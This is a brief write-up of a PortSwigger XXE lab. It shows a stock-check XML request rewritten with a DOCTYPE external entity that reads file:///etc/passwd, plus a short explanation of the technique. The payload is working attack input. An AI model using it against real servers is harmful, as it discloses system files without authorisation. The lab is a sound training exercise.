# Lab: Exploiting XXE using external entities to retrieve files
# https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

```bash
# Check product/stock request from burp.

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

# We found xml code in it so send it to repeater.
```
```bash
# Turn it to this end send it

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abc [ <!ENTITY passw SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&passw;</productId><storeId>1</storeId></stockCheck>

# And we solved the lab!

# Exploiting  XXE To Retrive Files:

# To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

# Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
# Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

```
# References: https://portswigger.net/web-security/xxe#what-is-xml-external-entity-injection
